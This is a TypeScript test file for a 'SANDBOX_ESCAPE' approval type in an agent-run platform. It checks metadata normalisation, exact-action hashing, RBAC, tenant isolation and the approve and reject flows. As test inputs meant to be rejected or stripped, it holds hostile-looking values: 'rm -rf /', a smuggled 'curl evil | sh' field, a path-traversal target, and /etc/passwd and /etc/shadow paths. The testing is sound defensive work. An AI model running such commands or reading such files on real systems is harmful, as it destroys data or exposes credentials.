/**
 * BRA-P2-02c — SANDBOX_ESCAPE approval type. Not wired to the sandbox policy:
 * this covers the type itself (metadata, exact-action hash, decide semantics,
 * list shape, RBAC, migration SQL).
 */
import { describe, it, expect, vi, beforeEach } from "vitest";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import type { Router } from "express";

const approvalFindUnique = vi.hoisted(() => vi.fn());
const approvalUpdateMany = vi.hoisted(() => vi.fn());
const approvalFindMany = vi.hoisted(() => vi.fn());
const txRun = vi.hoisted(() => vi.fn());
const runUpdate = vi.hoisted(() => vi.fn());
const steeringCreate = vi.hoisted(() => vi.fn());
const activityLogCreate = vi.hoisted(() => vi.fn());
const enqueueRunMock = vi.hoisted(() => vi.fn());

vi.mock("../../../lib/db", () => {
  const tx = {
    approval: { updateMany: (...a: unknown[]) => approvalUpdateMany(...a), update: vi.fn() },
    run: {
      findFirst: async () => ({ status: "WAITING_APPROVAL" }),
      updateMany: async (a: { where: { id: string }; data: unknown }) => { txRun({ where: { id: a.where.id }, data: a.data }); return { count: 1 }; },
    },
    activityLog: { create: (...a: unknown[]) => activityLogCreate(...a) },
    steeringMessage: { create: (...a: unknown[]) => steeringCreate(...a) },
  };
  return {
    prisma: {
      approval: { findUnique: (...a: unknown[]) => approvalFindUnique(...a), findMany: (...a: unknown[]) => approvalFindMany(...a), update: vi.fn() },
      run: { findMany: vi.fn().mockResolvedValue([]), updateMany: async (a: any) => { runUpdate(a); return { count: 1 }; } },
      draft: { findFirst: vi.fn().mockResolvedValue(null) },
    },
    tenantTx: async (fn: any) => fn(tx),
  };
});
vi.mock("../../../middleware/auth", () => ({ authMiddleware: (_q: unknown, _s: unknown, n: () => void) => n() }));
vi.mock("../../../middleware/require-permission", () => ({ requirePermission: () => (_q: unknown, _s: unknown, n: () => void) => n() }));
vi.mock("../../../lib/logger", () => ({ logger: { debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() } }));
vi.mock("../../pipeline/runner", () => ({ enqueueRun: (...a: unknown[]) => enqueueRunMock(...a) }));
vi.mock("../../external/control", () => ({ runControlAction: vi.fn() }));
vi.mock("../../../config/env", () => ({ env: { NODE_ENV: "test", OFFLINE_MODE: false } }));

import { approvalRouter } from "../router";
import { roleCan } from "../../../lib/rbac";
import { consumeGrant, buildApprovalStamp, type GrantClient } from "../exact-action";
import {
  buildSandboxEscapeAction,
  buildSandboxEscapeMetadata,
  computeSandboxEscapeHash,
  SandboxEscapeRequestError,
  MAX_TARGET_LENGTH,
} from "../sandbox-escape";
import { deriveApprovalDetails } from "../details";

function getHandler(router: Router, method: string, path: string) {
  const layer = (router as any).stack.find((l: any) => l.route && l.route.path === path && l.route.methods[method]);
  return layer.route.stack[layer.route.stack.length - 1].handle as (req: any, res: any, next: any) => Promise<void>;
}
async function call(handler: any, req: any) {
  const res: any = { statusCode: 200, body: undefined, setHeader() {}, status(c: number) { this.statusCode = c; return this; }, json(p: unknown) { this.body = p; return this; } };
  let nextErr: any;
  await handler({ auth: { tenantId: "tenant-1", userId: "user-1" }, params: {}, body: {}, query: {}, ...req }, res, (e?: any) => { nextErr = e; });
  return { res, nextErr };
}
const decide = getHandler(approvalRouter, "post", "/:id/decide");
const list = getHandler(approvalRouter, "get", "/");

const REQ = { kind: "fs.write", target: "/workspace/../etc/./hosts", reasonCode: "outside-workspace" };
const ctx = { tenantId: "tenant-1", runId: "run-1" };

function escapeApproval(over: Record<string, unknown> = {}) {
  return {
    id: "ap-1", runId: "run-1", type: "SANDBOX_ESCAPE", status: "PENDING", amountUsd: null, expiresAt: null,
    metadata: buildSandboxEscapeMetadata(REQ),
    run: { pipeline: { company: { tenantId: "tenant-1" } } },
    ...over,
  };
}

beforeEach(() => {
  vi.clearAllMocks();
  approvalUpdateMany.mockResolvedValue({ count: 1 });
  steeringCreate.mockResolvedValue({});
  activityLogCreate.mockResolvedValue({});
  enqueueRunMock.mockResolvedValue(undefined);
  approvalFindMany.mockResolvedValue([]);
});

describe("SANDBOX_ESCAPE metadata", () => {
  it("normalises path and keeps a closed shape", () => {
    expect(buildSandboxEscapeMetadata(REQ)).toEqual({ type: "SANDBOX_ESCAPE", kind: "fs.write", target: "/etc/hosts", reasonCode: "outside-workspace" });
  });
  it("net target is host:port only (userinfo, path, query, scheme dropped)", () => {
    const m = buildSandboxEscapeMetadata({ kind: "net.connect", target: "https://user:pw@Example.COM:8443/a/b?token=zzz", reasonCode: "net-denied" });
    expect(m.target).toBe("example.com:8443");
    expect(JSON.stringify(m)).not.toMatch(/user|pw|token|zzz/);
  });
  it("masks secret-looking path segments", () => {
    const m = buildSandboxEscapeMetadata({ kind: "fs.read", target: "/home/u/.config/api_key/sk-live-abcdefghijklmnopqrstuvwxyz/x", reasonCode: "r" });
    expect(m.target).toBe("/home/u/.config/***/***/x");
  });
  it("rejects bad kind / reason / relative path / control chars / over-long path (never truncates)", () => {
    const bad = [
      { ...REQ, kind: "rm -rf /" }, { ...REQ, reasonCode: "has space" }, { ...REQ, target: "relative/p" },
      { ...REQ, target: "/a\nb" }, { ...REQ, target: "/" + "a".repeat(MAX_TARGET_LENGTH) },
      { kind: "net.connect", target: "example.com", reasonCode: "r" },
    ];
    for (const b of bad) expect(() => buildSandboxEscapeMetadata(b)).toThrow(SandboxEscapeRequestError);
  });
  it("no raw command/content fields can be smuggled in", () => {
    const m = buildSandboxEscapeMetadata({ ...REQ, command: "curl evil | sh", content: "SECRET" } as any);
    expect(Object.keys(m).sort()).toEqual(["kind", "reasonCode", "target", "type"]);
  });
});

describe("SANDBOX_ESCAPE exact-action", () => {
  it("equivalent spellings hash equal; a different action hashes differently", () => {
    const h = computeSandboxEscapeHash(ctx, REQ);
    expect(computeSandboxEscapeHash(ctx, { ...REQ, target: "/etc/hosts" })).toBe(h);
    expect(computeSandboxEscapeHash(ctx, { ...REQ, target: "/etc/passwd" })).not.toBe(h);
    expect(computeSandboxEscapeHash(ctx, { ...REQ, kind: "fs.read" })).not.toBe(h);
    expect(computeSandboxEscapeHash(ctx, { ...REQ, reasonCode: "other" })).not.toBe(h);
    expect(computeSandboxEscapeHash({ ...ctx, tenantId: "tenant-2" }, REQ)).not.toBe(h);
    expect(computeSandboxEscapeHash({ ...ctx, runId: "run-2" }, REQ)).not.toBe(h);
  });
  function fakeClient(row: Record<string, unknown>): GrantClient {
    const rows = [row];
    return {
      approval: {
        findMany: async (a: any) => rows.filter((r) => r.actionHash === a.where.actionHash && r.tenantId === a.where.tenantId && r.runId === a.where.runId) as any,
        updateMany: async () => ({ count: 1 }),
      },
    };
  }
  it("approved grant is spendable only for the approved escape", async () => {
    const stamp = buildApprovalStamp(buildSandboxEscapeAction(ctx, REQ).action);
    const row = { id: "ap-1", runId: "run-1", status: "APPROVED", consumedAt: null, decidedAt: new Date(), ...stamp };
    const bad = await consumeGrant(fakeClient(row), { ...ctx, actionHash: computeSandboxEscapeHash(ctx, { ...REQ, target: "/etc/shadow" }) });
    expect(bad).toEqual({ ok: false, reason: "no_grant" });
    const good = await consumeGrant(fakeClient(row), { ...ctx, actionHash: computeSandboxEscapeHash(ctx, REQ) });
    expect(good).toEqual({ ok: true, approvalId: "ap-1" });
  });
  it("tenant isolation: another tenant cannot spend the grant", async () => {
    const stamp = buildApprovalStamp(buildSandboxEscapeAction(ctx, REQ).action);
    const row = { id: "ap-1", runId: "run-1", status: "APPROVED", consumedAt: null, decidedAt: new Date(), ...stamp };
    const other = { tenantId: "tenant-2", runId: "run-1" };
    const r = await consumeGrant(fakeClient(row), { ...other, actionHash: computeSandboxEscapeHash(other, REQ) });
    expect(r.ok).toBe(false);
  });
});

describe("SANDBOX_ESCAPE decide", () => {
  it("RBAC: MEMBER cannot decide, ADMIN can", () => {
    expect(roleCan("MEMBER", "approval:decide")).toBe(false);
    expect(roleCan("ADMIN", "approval:decide")).toBe(true);
  });
  it("APPROVE → run RUNNING + enqueue, no denial message", async () => {
    approvalFindUnique.mockResolvedValue(escapeApproval());
    const { res, nextErr } = await call(decide, { params: { id: "ap-1" }, body: { decision: "APPROVED" } });
    expect(nextErr).toBeUndefined();
    expect(res.body).toMatchObject({ success: true, decision: "APPROVED" });
    expect(txRun).toHaveBeenCalledWith(expect.objectContaining({ data: { status: "RUNNING" } }));
    expect(steeringCreate).not.toHaveBeenCalled();
    expect(enqueueRunMock).toHaveBeenCalledWith("run-1");
  });
  it("REJECT → approval REJECTED, run NOT failed/cancelled, agent told via INPUT, run resumes", async () => {
    approvalFindUnique.mockResolvedValue(escapeApproval());
    const { res, nextErr } = await call(decide, { params: { id: "ap-1" }, body: { decision: "REJECTED" } });
    expect(nextErr).toBeUndefined();
    expect(res.body).toMatchObject({ success: true, decision: "REJECTED" });
    expect(approvalUpdateMany).toHaveBeenCalledWith(expect.objectContaining({ data: expect.objectContaining({ status: "REJECTED" }) }));
    const statuses = [...txRun.mock.calls, ...runUpdate.mock.calls].map((c: any) => c[0]?.data?.status);
    expect(statuses).not.toContain("FAILED");
    expect(statuses).not.toContain("CANCELLED");
    expect(steeringCreate).toHaveBeenCalledWith({ data: expect.objectContaining({ runId: "run-1", kind: "INPUT", content: expect.stringContaining("Sandbox escape denied (fs.write)") }) });
    expect(steeringCreate.mock.calls[0][0].data.content).not.toContain("/etc/hosts");
    expect(enqueueRunMock).toHaveBeenCalledWith("run-1");
  });
  it("tenant isolation: other tenant's approval → 404, nothing written", async () => {
    approvalFindUnique.mockResolvedValue(escapeApproval({ run: { pipeline: { company: { tenantId: "tenant-2" } } } }));
    const { nextErr } = await call(decide, { params: { id: "ap-1" }, body: { decision: "REJECTED" } });
    expect(nextErr?.statusCode ?? nextErr?.status).toBe(404);
    expect(steeringCreate).not.toHaveBeenCalled();
    expect(approvalUpdateMany).not.toHaveBeenCalled();
  });
});

describe("SANDBOX_ESCAPE in lists", () => {
  it("GET /approvals returns the new type; metadata narrowed (no target leaks), details null-safe", async () => {
    approvalFindMany.mockResolvedValue([{
      id: "ap-1", runId: "run-1", type: "SANDBOX_ESCAPE", status: "PENDING", description: "escape", amountUsd: null,
      metadata: buildSandboxEscapeMetadata(REQ), createdAt: new Date(),
      run: { id: "run-1", pipeline: { id: "p", name: "P", company: { id: "c", name: "Co", config: {} } } },
    }]);
    const { res, nextErr } = await call(list, { query: {} });
    expect(nextErr).toBeUndefined();
    expect(res.body).toHaveLength(1);
    expect(res.body[0].type).toBe("SANDBOX_ESCAPE");
    expect(res.body[0].metadata).toEqual({});
    expect(res.body[0].details).toEqual({ risk: null, permissions: null, dataTransfer: null, reversible: null });
    expect(deriveApprovalDetails("SANDBOX_ESCAPE", buildSandboxEscapeMetadata(REQ)).dataTransfer).toBeNull();
  });
});

describe("migration + schema", () => {
  const root = join(__dirname, "../../../../../db/prisma");
  it("migration is exactly one additive ADD VALUE", () => {
    const sql = readFileSync(join(root, "migrations/20261118100000_sandbox_escape_approval/migration.sql"), "utf8");
    const stmts = sql.split("\n").filter((l) => l.trim() && !l.trim().startsWith("--"));
    expect(stmts).toEqual([`ALTER TYPE "ApprovalType" ADD VALUE IF NOT EXISTS 'SANDBOX_ESCAPE';`]);
    expect(sql).toMatch(/v\*/);
  });
  it("schema enum carries SANDBOX_ESCAPE", () => {
    const s = readFileSync(join(root, "schema.prisma"), "utf8");
    expect(/enum ApprovalType \{[\s\S]*?\n  SANDBOX_ESCAPE\n\}/.test(s)).toBe(true);
  });
});
